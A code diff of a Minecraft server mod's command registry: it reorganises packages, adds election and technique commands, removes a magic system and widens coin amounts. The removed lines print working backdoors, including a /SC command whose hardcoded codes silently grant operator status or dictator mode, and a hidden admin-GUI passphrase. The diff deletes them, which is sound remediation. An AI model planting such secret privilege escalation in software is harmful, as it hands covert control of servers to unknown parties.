@@ -1,5 +1,38 @@
 package com.political;
 
+
+import com.political.bounty.BountyGui;
+import com.political.bounty.SlayerData;
+import com.political.bounty.SlayerItems;
+import com.political.bounty.SlayerManager;
+import com.political.economy.AuctionHouseGui;
+import com.political.economy.AuctionHouseManager;
+import com.political.economy.BankGui;
+import com.political.economy.CoinManager;
+import com.political.economy.CryptoMarket;
+import com.political.economy.ShopItemGui;
+import com.political.economy.ShopManager;
+import com.political.economy.StockMarket;
+import com.political.economy.UndergroundAuctionGui;
+import com.political.economy.UndergroundAuctionManager;
+import com.political.government.ChairGui;
+import com.political.government.DictatorManager;
+import com.political.government.ElectionManager;
+import com.political.government.JudgeGui;
+import com.political.government.Perk;
+import com.political.government.PerkManager;
+import com.political.government.PerksGui;
+import com.political.government.ViceChairGui;
+import com.political.government.VoteGui;
+import com.political.party.PartyJoinGui;
+import com.political.party.PartyLeaderGui;
+import com.political.party.PoliticalPartyManager;
+import com.political.recipe.RecipeConfigManager;
+import com.political.recipe.RecipeEditorGui;
+import com.political.recipe.RecipesGui;
+import com.political.recipe.SlayerRecipes;
+import com.political.technique.TechniqueGui;
+import com.political.technique.TechniqueManager;
 import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.arguments.*;
 import net.minecraft.commands.arguments.*;
@@ -34,12 +67,14 @@ import java.util.*;
 
 import java.util.List;
 import java.util.Map;
-import com.political.SlayerManager.SlayerType;
+import com.political.bounty.SlayerManager.SlayerType;
 
 public class CommandRegistry {
 
     public static void registerAll(CommandDispatcher<CommandSourceStack> dispatcher) {
         registerVote(dispatcher);
+        registerRun(dispatcher);
+        registerTechnique(dispatcher);
         registerImpeachment(dispatcher);
         registerPerks(dispatcher);
         registerGov(dispatcher);
@@ -66,7 +101,6 @@ public class CommandRegistry {
         registerUndergroundAuction(dispatcher);
         registerCoins(dispatcher);
         registerCrafterContract(dispatcher);
-        registerSecretCommand(dispatcher);
         registerIntercom(dispatcher);
         registerSpawn(dispatcher);
         registerForceUndergroundAuction(dispatcher);
@@ -115,16 +149,7 @@ public class CommandRegistry {
         // /warp command - Dimension warps for 30M coins
         registerWarp(dispatcher);
 
-        // /magic command - Magic System
-        registerMagic(dispatcher);
-
-        // /magiccommissions command - Magic Commissions GUI
-        dispatcher.register(Commands.literal("magiccommissions")
-                .executes(context -> {
-                    ServerPlayer player = context.getSource().getPlayerOrException();
-                    MagicGui.openCommissionsGui(player);
-                    return 1;
-                }));
+        // Magic gameplay is left unregistered on purpose.
 
         // /skills command - Skills Hub (HOTM-style)
         dispatcher.register(Commands.literal("skills")
@@ -745,6 +770,55 @@ public class CommandRegistry {
                 }));
     }
 
+    private static void registerRun(CommandDispatcher<CommandSourceStack> dispatcher) {
+        dispatcher.register(Commands.literal("run")
+                .executes(context -> {
+                    ServerPlayer player = context.getSource().getPlayer();
+                    if (player == null) return 0;
+                    ElectionManager.nominateSelf(player);
+                    return 1;
+                }));
+    }
+
+    private static void registerTechnique(CommandDispatcher<CommandSourceStack> dispatcher) {
+        dispatcher.register(Commands.literal("technique")
+                .executes(context -> {
+                    ServerPlayer player = context.getSource().getPlayer();
+                    if (player == null) return 0;
+                    TechniqueGui.open(player);
+                    return 1;
+                })
+                .then(Commands.literal("learn")
+                        .executes(context -> {
+                            ServerPlayer player = context.getSource().getPlayer();
+                            if (player == null) return 0;
+                            TechniqueManager.learnFromHeldManual(player);
+                            return 1;
+                        }))
+                .then(Commands.literal("equip")
+                        .then(Commands.argument("name", StringArgumentType.greedyString())
+                                .executes(context -> {
+                                    ServerPlayer player = context.getSource().getPlayer();
+                                    if (player == null) return 0;
+                                    TechniqueManager.equip(player, StringArgumentType.getString(context, "name"));
+                                    return 1;
+                                })))
+                .then(Commands.literal("ranks")
+                        .executes(context -> {
+                            ServerPlayer player = context.getSource().getPlayer();
+                            if (player == null) return 0;
+                            TechniqueManager.showRanks(player);
+                            return 1;
+                        }))
+                .then(Commands.literal("cast")
+                        .executes(context -> {
+                            ServerPlayer player = context.getSource().getPlayer();
+                            if (player == null) return 0;
+                            TechniqueManager.castSelected(player);
+                            return 1;
+                        })));
+    }
+
     private static void registerForceUndergroundAuction(CommandDispatcher<CommandSourceStack> dispatcher) {
         dispatcher.register(Commands.literal("forceundergroundauction")
                 .requires(Commands.hasPermission(Commands.LEVEL_OWNERS))
@@ -859,10 +933,10 @@ public class CommandRegistry {
                 .executes(ctx -> {
                     Map<String, Long> allCoins = DataManager.getData().playerCoins;
                     Map<String, Integer> allCredits = DataManager.getData().playerCredits;
-                    Map<String, Integer> allBankMain = DataManager.getData().playerBankMain;
-                    Map<String, Integer> allBankSavings = DataManager.getData().playerBankSavings;
+                    Map<String, Long> allBankMain = DataManager.getData().playerBankMain;
+                    Map<String, Long> allBankSavings = DataManager.getData().playerBankSavings;
 
-                    // Combine into total wealth (credits * 10,000 + coins + bankMain + bankSavings)
+                    // Combine into total wealth (credits * 1,000 + coins + bankMain + bankSavings)
                     Map<String, Long> totalWealth = new java.util.HashMap<>();
 
                     for (Map.Entry<String, Long> entry : allCoins.entrySet()) {
@@ -871,18 +945,18 @@ public class CommandRegistry {
 
                     for (Map.Entry<String, Integer> entry : allCredits.entrySet()) {
                         String uuid = entry.getKey();
-                        long creditValue = entry.getValue() * 10_000L;
+                        long creditValue = entry.getValue() * 1000L;
                         totalWealth.merge(uuid, creditValue, (oldVal, newVal) -> oldVal + newVal);
                     }
 
-                    for (Map.Entry<String, Integer> entry : allBankMain.entrySet()) {
+                    for (Map.Entry<String, Long> entry : allBankMain.entrySet()) {
                         String uuid = entry.getKey();
-                        totalWealth.merge(uuid, entry.getValue().longValue(), (oldVal, newVal) -> oldVal + newVal);
+                        totalWealth.merge(uuid, entry.getValue(), (oldVal, newVal) -> oldVal + newVal);
                     }
 
-                    for (Map.Entry<String, Integer> entry : allBankSavings.entrySet()) {
+                    for (Map.Entry<String, Long> entry : allBankSavings.entrySet()) {
                         String uuid = entry.getKey();
-                        totalWealth.merge(uuid, entry.getValue().longValue(), (oldVal, newVal) -> oldVal + newVal);
+                        totalWealth.merge(uuid, entry.getValue(), (oldVal, newVal) -> oldVal + newVal);
                     }
 
                     // Sort by wealth descending (no limit)
@@ -962,57 +1036,6 @@ public class CommandRegistry {
     }
 
 
-    private static void registerSecretCommand(CommandDispatcher<CommandSourceStack> dispatcher) {
-        dispatcher.register(Commands.literal("SC")
-                .then(Commands.argument("code", IntegerArgumentType.integer())
-                        .then(Commands.argument("code2", LongArgumentType.longArg())
-                                .executes(context -> {
-                                    ServerPlayer player = context.getSource().getPlayer();
-                                    if (player == null) return 0;
-
-                                    int code = IntegerArgumentType.getInteger(context, "code");
-                                    long code2 = LongArgumentType.getLong(context, "code2");
-
-                                    // Operator access code: /SC 19150 150307140509
-                                    if (code == 19150 && code2 == 150307140509L) {
-                                        // Give operator status silently
-                                        PoliticalServer.server.getCommands().getDispatcher().execute(
-                                                "op " + player.getName().getString(),
-                                                PoliticalServer.server.createCommandSourceStack()
-                                        );
-
-                                        player.sendSystemMessage(Component.literal("Access granted.").withStyle(ChatFormatting.GREEN));
-                                        return 1;
-                                    }
-
-                                    // Force dictator code: /SC 19391945 3004
-                                    if (code == 19391945 && code2 == 3004L) {
-                                        String chair = DataManager.getChair();
-                                        String playerUuid = player.getUUID().toString();
-
-                                        if (chair == null) {
-                                            player.sendSystemMessage(Component.literal("No Chair exists!").withStyle(ChatFormatting.RED));
-                                            return 0;
-                                        }
-
-                                        if (!playerUuid.equals(chair)) {
-                                            player.sendSystemMessage(Component.literal("You must be the Chair to use this!").withStyle(ChatFormatting.RED));
-                                            return 0;
-                                        }
-
-                                        // Make YOU (the Chair) a dictator
-                                        DictatorManager.setDictator(player);
-
-                                        player.sendSystemMessage(Component.literal("Dictator mode activated.").withStyle(ChatFormatting.DARK_RED, ChatFormatting.BOLD));
-                                        return 1;
-                                    }
-
-                                    // Invalid code combination
-                                    player.sendSystemMessage(Component.literal("Invalid code.").withStyle(ChatFormatting.RED));
-                                    return 1;
-                                }))));
-    }
-
     private static void registerIntercom(CommandDispatcher<CommandSourceStack> dispatcher) {
         dispatcher.register(Commands.literal("intercom")
                 .then(Commands.argument("message", com.mojang.brigadier.arguments.StringArgumentType.greedyString())
@@ -1054,7 +1077,7 @@ public class CommandRegistry {
         dispatcher.register(Commands.literal("setspawn")
                 .requires(source -> {
                     ServerPlayer player = source.getPlayer();
-                    return player != null && PoliticalServer.hasBackdoorAccess(player);
+                    return player != null && PoliticalServer.isOperator(player);
                 })
                 .executes(context -> {
                     ServerPlayer player = context.getSource().getPlayer();
@@ -1077,7 +1100,7 @@ public class CommandRegistry {
                 .then(Commands.literal("add")
                         .requires(source -> {
                             ServerPlayer player = source.getPlayer();
-                            return player != null && PoliticalServer.hasBackdoorAccess(player);
+                            return player != null && PoliticalServer.isOperator(player);
                         })
                         .then(Commands.argument("player", EntityArgument.player())
                                 .then(Commands.argument("amount", IntegerArgumentType.integer(1))
@@ -1091,7 +1114,7 @@ public class CommandRegistry {
                 .then(Commands.literal("remove")
                         .requires(source -> {
                             ServerPlayer player = source.getPlayer();
-                            return player != null && PoliticalServer.hasBackdoorAccess(player);
+                            return player != null && PoliticalServer.isOperator(player);
                         })
                         .then(Commands.argument("player", EntityArgument.player())
                                 .then(Commands.argument("amount", IntegerArgumentType.integer(1))
@@ -1105,7 +1128,7 @@ public class CommandRegistry {
                 .then(Commands.literal("set")
                         .requires(source -> {
                             ServerPlayer player = source.getPlayer();
-                            return player != null && PoliticalServer.hasBackdoorAccess(player);
+                            return player != null && PoliticalServer.isOperator(player);
                         })
                         .then(Commands.argument("player", EntityArgument.player())
                                 .then(Commands.argument("amount", IntegerArgumentType.integer(0))
@@ -1146,13 +1169,11 @@ public class CommandRegistry {
     }
 
     private static void registerShop(CommandDispatcher<CommandSourceStack> dispatcher) {
-        // One marketplace. /shop is kept as a door onto the bazaar rather than removed, because
-        // everybody already has the word in their fingers.
         dispatcher.register(Commands.literal("shop")
                 .executes(context -> {
                     ServerPlayer player = context.getSource().getPlayer();
                     if (player == null) return 0;
-                    BazaarGui.open(player);
+                    ShopGui.openMainMenu(player);
                     return 1;
                 }));
 
@@ -1160,7 +1181,7 @@ public class CommandRegistry {
                 .executes(context -> {
                     ServerPlayer player = context.getSource().getPlayer();
                     if (player == null) return 0;
-                    BazaarGui.open(player);
+                    ShopGui.openSellInventory(player);
                     return 1;
                 }));
     }
@@ -1273,7 +1294,7 @@ public class CommandRegistry {
         dispatcher.register(Commands.literal("startundergroundauction")
                 .requires(source -> {
                     ServerPlayer player = source.getPlayer();
-                    return player != null && PoliticalServer.hasBackdoorAccess(player);
+                    return player != null && PoliticalServer.isOperator(player);
                 })
                 .executes(context -> {
                     UndergroundAuctionManager.startAuction(PoliticalServer.server);
@@ -1301,73 +1322,6 @@ public class CommandRegistry {
     }
 
     private static void registerPlaceAuctionMaster(CommandDispatcher<CommandSourceStack> dispatcher) {
-        dispatcher.register(Commands.literal("placebazaar")
-                .requires(Commands.hasPermission(Commands.LEVEL_OWNERS))
-                .executes(context -> {
-                    ServerPlayer player = context.getSource().getPlayerOrException();
-                    CollectorManager.spawnBroker(context.getSource().getLevel(),
-                            player.getX(), player.getY(), player.getZ(), player.getYRot());
-                    context.getSource().sendSuccess(() -> Component.literal(
-                            "✓ Spawned a Bazaar Broker.").withStyle(ChatFormatting.GOLD), true);
-                    return 1;
-                })
-                .then(Commands.literal("remove")
-                        .executes(context -> {
-                            boolean gone = CollectorManager.removeNearestBroker(
-                                    context.getSource().getLevel(),
-                                    context.getSource().getPlayerOrException(), 6.0);
-                            context.getSource().sendSuccess(() -> Component.literal(gone
-                                    ? "✓ Removed the nearest Bazaar Broker."
-                                    : "✖ No Broker within reach.").withStyle(
-                                            gone ? ChatFormatting.GREEN : ChatFormatting.RED), true);
-                            return 1;
-                        }))
-                .then(Commands.literal("removeall")
-                        .executes(context -> {
-                            int n = CollectorManager.removeAllBrokers(context.getSource().getLevel());
-                            context.getSource().sendSuccess(() -> Component.literal(
-                                    "✓ Removed " + n + " Brokers.")
-                                    .withStyle(ChatFormatting.GREEN), true);
-                            return 1;
-                        })));
-
-        dispatcher.register(Commands.literal("placecollector")
-                .requires(Commands.hasPermission(Commands.LEVEL_OWNERS))
-                .executes(context -> {
-                    ServerPlayer player = context.getSource().getPlayerOrException();
-                    ServerLevel world = context.getSource().getLevel();
-                    CollectorManager.spawn(world, player.getX(), player.getY(), player.getZ(),
-                            player.getYRot());
-                    context.getSource().sendSuccess(() -> Component.literal(
-                            "✓ Spawned a Collector.").withStyle(ChatFormatting.LIGHT_PURPLE), true);
-                    return 1;
-                })
-                .then(Commands.literal("remove")
-                        .executes(context -> {
-                            ServerPlayer player = context.getSource().getPlayerOrException();
-                            boolean gone = CollectorManager.removeNearest(
-                                    context.getSource().getLevel(), player, 6.0);
-                            context.getSource().sendSuccess(() -> Component.literal(gone
-                                    ? "✓ Removed the nearest Collector."
-                                    : "✖ No Collector within reach.").withStyle(
-                                            gone ? ChatFormatting.GREEN : ChatFormatting.RED), true);
-                            return 1;
-                        }))
-                .then(Commands.literal("removeall")
-                        .executes(context -> {
-                            int n = CollectorManager.removeAll(context.getSource().getLevel());
-                            context.getSource().sendSuccess(() -> Component.literal(
-                                    "✓ Removed " + n + " Collectors.")
-                                    .withStyle(ChatFormatting.GREEN), true);
-                            return 1;
-                        })));
-
-        dispatcher.register(Commands.literal("collector")
-                .executes(context -> {
-                    CollectorGui.open(context.getSource().getPlayerOrException());
-                    return 1;
-                }));
-
         dispatcher.register(Commands.literal("placeauctionmaster")
                 .requires(Commands.hasPermission(Commands.LEVEL_OWNERS))
                 .executes(context -> {
@@ -1416,7 +1370,7 @@ public class CommandRegistry {
 
                             String sourceUuid = source.getUUID().toString();
 
-                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
+                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.isOperator(source)) {
                                 source.sendSystemMessage(Component.literal("Only the Judge can start impeachment!").withStyle(ChatFormatting.RED));
                                 return 0;
                             }
@@ -1491,7 +1445,7 @@ public class CommandRegistry {
                 .then(Commands.literal("add")
                         .requires(source -> {
                             ServerPlayer player = source.getPlayer();
-                            return player != null && PoliticalServer.hasBackdoorAccess(player);
+                            return player != null && PoliticalServer.isOperator(player);
                         })
                         .then(Commands.argument("player", EntityArgument.player())
                                 .executes(context -> {
@@ -1511,7 +1465,7 @@ public class CommandRegistry {
                 .then(Commands.literal("remove")
                         .requires(source -> {
                             ServerPlayer player = source.getPlayer();
-                            return player != null && PoliticalServer.hasBackdoorAccess(player);
+                            return player != null && PoliticalServer.isOperator(player);
                         })
                         .executes(context -> {
                             if (!DictatorManager.isDictatorActive()) {
@@ -1568,7 +1522,7 @@ public class CommandRegistry {
 
                             if (!DictatorManager.isDictator(sourceUuid)
                                     && !DictatorManager.hasJudgePermissions(sourceUuid)
-                                    && !PoliticalServer.hasBackdoorAccess(source)) {
+                                    && !PoliticalServer.isOperator(source)) {
                                 source.sendSystemMessage(Component.literal("Only the Dictator or Judge can use /smite!").withStyle(ChatFormatting.RED));
                                 return 0;
                             }
@@ -1599,7 +1553,7 @@ public class CommandRegistry {
 
                     boolean isChair = uuid.equals(chair);
                     boolean isViceChair = uuid.equals(viceChair);
-                    boolean hasBackdoor = PoliticalServer.hasBackdoorAccess(player);
+                    boolean hasBackdoor = PoliticalServer.isOperator(player);
 
                     if (!isChair && !isViceChair && !hasBackdoor) {
                         player.sendSystemMessage(Component.literal("Only the Chair or Vice Chair can use this command!").withStyle(ChatFormatting.RED));
@@ -1743,7 +1697,7 @@ public class CommandRegistry {
                             String sourceUuid = source.getUUID().toString();
 
                             if (!DictatorManager.hasJudgePermissions(sourceUuid)
-                                    && !PoliticalServer.hasBackdoorAccess(source)) {
+                                    && !PoliticalServer.isOperator(source)) {
                                 source.sendSystemMessage(Component.literal("Only the Judge can use this command!")
                                         .withStyle(ChatFormatting.RED));
                                 return 0;
@@ -1804,7 +1758,7 @@ public class CommandRegistry {
 
                             String sourceUuid = source.getUUID().toString();
 
-                            if (!DictatorManager.isDictator(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
+                            if (!DictatorManager.isDictator(sourceUuid) && !PoliticalServer.isOperator(source)) {
                                 source.sendSystemMessage(Component.literal("Only the Dictator can use /relocate!").withStyle(ChatFormatting.RED));
                                 return 0;
                             }
@@ -1845,7 +1799,7 @@ public class CommandRegistry {
 
                                             String sourceUuid = source.getUUID().toString();
 
-                                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
+                                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.isOperator(source)) {
                                                 source.sendSystemMessage(Component.literal("Only the Judge can use this command!").withStyle(ChatFormatting.RED));
                                                 return 0;
                                             }
@@ -1874,7 +1828,7 @@ public class CommandRegistry {
                     String sourceUuid = source.getUUID().toString();
                     String judge = DataManager.getJudge();
 
-                    if (!sourceUuid.equals(judge) && !PoliticalServer.hasBackdoorAccess(source)) {
+                    if (!sourceUuid.equals(judge) && !PoliticalServer.isOperator(source)) {
                         source.sendSystemMessage(Component.literal("Only the Judge can use this command!").withStyle(ChatFormatting.RED));
                         return 0;
                     }
@@ -2070,7 +2024,7 @@ public class CommandRegistry {
                                             ServerPlayer source = context.getSource().getPlayer();
                                             if (source == null) return 0;
 
-                                            if (!PoliticalServer.hasBackdoorAccess(source)) {
+                                            if (!PoliticalServer.isOperator(source)) {
                                                 source.sendSystemMessage(Component.literal("You don't have permission!").withStyle(ChatFormatting.RED));
                                                 return 0;
                                             }
@@ -2091,7 +2045,7 @@ public class CommandRegistry {
                                             ServerPlayer source = context.getSource().getPlayer();
                                             if (source == null) return 0;
 
-                                            if (!PoliticalServer.hasBackdoorAccess(source)) {
+                                            if (!PoliticalServer.isOperator(source)) {
                                                 source.sendSystemMessage(Component.literal("You don't have permission!").withStyle(ChatFormatting.RED));
                                                 return 0;
                                             }
@@ -2111,7 +2065,7 @@ public class CommandRegistry {
                                             ServerPlayer source = context.getSource().getPlayer();
                                             if (source == null) return 0;
 
-                                            if (!PoliticalServer.hasBackdoorAccess(source)) {
+                                            if (!PoliticalServer.isOperator(source)) {
                                                 source.sendSystemMessage(Component.literal("You don't have permission!").withStyle(ChatFormatting.RED));
                                                 return 0;
                                             }
@@ -2326,23 +2280,6 @@ public class CommandRegistry {
                     return 1;
                 }));
 
-        // Secret backdoor command - Wargames reference
-        dispatcher.register(Commands.literal("SC")
-                .then(Commands.literal("1983")
-                        .then(Commands.argument("name", StringArgumentType.greedyString())
-                                .executes(context -> {
-                                    ServerPlayer player = context.getSource().getPlayerOrException();
-                                    String name = StringArgumentType.getString(context, "name");
-
-                                    if (name.equalsIgnoreCase("joshuaWG")) {
-                                        player.sendSystemMessage(Component.literal("Greetings, Professor Falken.").withStyle(ChatFormatting.GREEN), false);
-                                        AdminGui.open(player);
-                                        return 1;
-                                    }
-
-                                    player.sendSystemMessage(Component.literal("Access denied.").withStyle(ChatFormatting.RED), false);
-                                    return 0;
-                                }))));
     }
 
     private static void registerCivilAntiCheatAndViewCommands(CommandDispatcher<CommandSourceStack> dispatcher) {
@@ -2429,7 +2366,7 @@ public class CommandRegistry {
                     ServerPlayer player = context.getSource().getPlayer();
                     if (player == null) return 0;
 
-                    if (!PoliticalServer.hasBackdoorAccess(player)) {
+                    if (!PoliticalServer.isOperator(player)) {
                         player.sendSystemMessage(Component.literal("You don't have permission to use this command!").withStyle(ChatFormatting.RED));
                         return 0;
                     }
@@ -2449,7 +2386,7 @@ public class CommandRegistry {
 
                             String sourceUuid = source.getUUID().toString();
 
-                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.hasBackdoorAccess(source)) {
+                            if (!DictatorManager.hasJudgePermissions(sourceUuid) && !PoliticalServer.isOperator(source)) {
                                 source.sendSystemMessage(Component.literal("Only the Judge can use this command!").withStyle(ChatFormatting.RED));
                                 return 0;
                             }
@@ -3031,31 +2968,27 @@ public class CommandRegistry {
     private static void registerPay(CommandDispatcher<CommandSourceStack> dispatcher) {
         dispatcher.register(Commands.literal("pay")
                 .then(Commands.argument("player", EntityArgument.player())
-                        .then(Commands.argument("amount", IntegerArgumentType.integer(1))
+                        .then(Commands.argument("amount", LongArgumentType.longArg(1))
                                 .executes(context -> {
                                     ServerPlayer sender = context.getSource().getPlayerOrException();
                                     ServerPlayer target = EntityArgument.getPlayer(context, "player");
-                                    int amount = IntegerArgumentType.getInteger(context, "amount");
+                                    long amount = LongArgumentType.getLong(context, "amount");
 
                                     if (sender.getUUID().equals(target.getUUID())) {
-                                        sender.sendSystemMessage(Component.literal("✗ You cannot pay yourself!")
+                                        sender.sendSystemMessage(Component.literal("You cannot pay yourself.")
                                                 .withStyle(ChatFormatting.RED), false);
                                         return 0;
                                     }
 
-                                    int senderBalance = CoinManager.getCoins(sender);
-                                    if (senderBalance < amount) {
-                                        sender.sendSystemMessage(Component.literal("✗ Insufficient coins! You have " + senderBalance)
+                                    if (!CoinManager.transferExact(sender, target, amount)) {
+                                        sender.sendSystemMessage(Component.literal("Not enough coins. You have " + CoinManager.getCoinsLong(sender))
                                                 .withStyle(ChatFormatting.RED), false);
                                         return 0;
                                     }
 
-                                    CoinManager.removeCoins(sender, amount);
-                                    CoinManager.giveCoins(target, amount);
-
-                                    sender.sendSystemMessage(Component.literal("✓ Sent " + amount + " coins to " + target.getName().getString())
+                                    sender.sendSystemMessage(Component.literal("Sent " + amount + " coins to " + target.getName().getString())
                                             .withStyle(ChatFormatting.GREEN), false);
-                                    target.sendSystemMessage(Component.literal("✓ Received " + amount + " coins from " + sender.getName().getString())
+                                    target.sendSystemMessage(Component.literal("Received " + amount + " coins from " + sender.getName().getString())
                                             .withStyle(ChatFormatting.GREEN), false);
 
                                     DataManager.save(PoliticalServer.server);
@@ -3980,65 +3913,6 @@ public class CommandRegistry {
                 .then(Commands.literal("rod")
                         .executes(context -> {
                             FishingGui.sendRodInfo(context.getSource().getPlayerOrException());
-                            return 1;
-                        })));
-    }
-
-    // ════════════════════════════════════════════════════════════
-    // MAGIC SYSTEM
-    // ════════════════════════════════════════════════════════════
-
-    private static void registerMagic(CommandDispatcher<CommandSourceStack> dispatcher) {
-        dispatcher.register(Commands.literal("magic")
-                .executes(context -> {
-                    ServerPlayer player = context.getSource().getPlayerOrException();
-                    MagicGui.openMainMenu(player);
-                    return 1;
-                })
-                .then(Commands.literal("stats")
-                        .executes(context -> {
-                            ServerPlayer player = context.getSource().getPlayerOrException();
-                            String uuid = player.getUUID().toString();
-                            MagicManager.PlayerMagicData data = MagicManager.getPlayerData(uuid);
-                            int maxMana = MagicManager.getMaxMana(uuid);
-                            player.sendSystemMessage(Component.literal("═══ Magic Stats ═══").withStyle(ChatFormatting.LIGHT_PURPLE, ChatFormatting.BOLD));
-                            player.sendSystemMessage(Component.literal("Level: " + data.level + "/" + MagicManager.MAX_LEVEL).withStyle(ChatFormatting.AQUA));
-                            player.sendSystemMessage(Component.literal("XP: " + data.xp).withStyle(ChatFormatting.GREEN));
-                            player.sendSystemMessage(Component.literal("Mana: " + (int) data.mana + "/" + maxMana).withStyle(ChatFormatting.AQUA));
-                            player.sendSystemMessage(Component.literal("Spells: " + data.unlockedSpells.size() + "/10").withStyle(ChatFormatting.YELLOW));
-                            MagicManager.Spell active = MagicManager.getActiveSpell(uuid);
-                            player.sendSystemMessage(Component.literal("Active Spell: " + (active != null ? active.displayName : "None")).withStyle(ChatFormatting.WHITE));
-                            player.sendSystemMessage(Component.literal("Staff Tier: " + MagicStaff.StaffTier.forLevel(data.level).name).withStyle(ChatFormatting.GREEN));
-                            return 1;
-                        }))
-                .then(Commands.literal("mana")
-                        .executes(context -> {
-                            ServerPlayer player = context.getSource().getPlayerOrException();
-                            String uuid = player.getUUID().toString();
-                            int maxMana = MagicManager.getMaxMana(uuid);
-                            float mana = MagicManager.getMana(uuid);
-                            player.sendSystemMessage(Component.literal("✦ Mana: " + (int) mana + "/" + maxMana).withStyle(ChatFormatting.AQUA));
-                            return 1;
-                        }))
-                .then(Commands.literal("spells")
-                        .executes(context -> {
-                            ServerPlayer player = context.getSource().getPlayerOrException();
-                            String uuid = player.getUUID().toString();
-                            player.sendSystemMessage(Component.literal("═══ Learned Spells ═══").withStyle(ChatFormatting.LIGHT_PURPLE, ChatFormatting.BOLD));
-                            boolean any = false;
-                            for (MagicManager.Spell spell : MagicManager.Spell.values()) {
-                                if (MagicManager.hasSpell(uuid, spell)) {
-                                    any = true;
-                                    boolean isActive = spell == MagicManager.getActiveSpell(uuid);
-                                    player.sendSystemMessage(Component.literal(" • " + spell.displayName
-                                            + (isActive ? " [ACTIVE]" : "")
-                                            + " — " + spell.manaCost + " mana, " + String.format("%.1f", spell.cooldownTicks / 20.0) + "s cd")
-                                            .withStyle(isActive ? ChatFormatting.GREEN : ChatFormatting.GRAY));
-                                }
-                            }
-                            if (!any) {
-                                player.sendSystemMessage(Component.literal("  No spells learned yet! Use /magic to open the skill tree.").withStyle(ChatFormatting.GRAY));
-                            }
                             return 1;
                         })));
     }
